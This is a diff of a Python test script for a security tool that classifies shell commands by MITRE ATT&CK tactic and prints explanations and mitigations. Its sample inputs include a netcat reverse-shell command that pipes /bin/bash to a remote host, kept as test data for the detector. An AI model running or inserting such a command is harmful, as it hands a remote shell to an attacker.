@@ -1,9 +1,8 @@
-from engine import ThreatClassifier
+from engine import load_mitre_playbook, build_mitre_index, explain_command
+from model.classifier import classify
 
-clf = ThreatClassifier(
-    bert_path="./bert_security_model",
-    mitre_path="./mitre_attack.json"
-)
+playbook = load_mitre_playbook("./mitre_attack.json")
+mitre_index = build_mitre_index(playbook)
 
 test_commands = [
     "nc -e /bin/bash 192.168.1.1 4444",
@@ -17,11 +16,19 @@ test_commands = [
 ]
 
 for cmd in test_commands:
-    result = clf.analyze(cmd)
+    result = classify(cmd)
+    if result["tactic"] != "BENIGN":
+        _, technique_id, explanation, mitigations = explain_command(cmd, mitre_index)
+    else:
+        technique_id = None
+        explanation = "Command appears benign."
+        mitigations = []
+
     print(f"CMD : {cmd}")
-    print(f"  Verdict:     {result['verdict']}")
     print(f"  Tactic:      {result['tactic']}")
-    print(f"  Technique:   {result['technique_id']}")
-    print(f"  Explanation: {result['explanation'][:100]}")
-    print(f"  Mitigations: {len(result['mitigations'])}")
+    print(f"  Confidence:  {result['confidence']}")
+    print(f"  Source:      {result['source']}")
+    print(f"  Technique:   {technique_id}")
+    print(f"  Explanation: {explanation[:100]}")
+    print(f"  Mitigations: {len(mitigations)}")
     print()
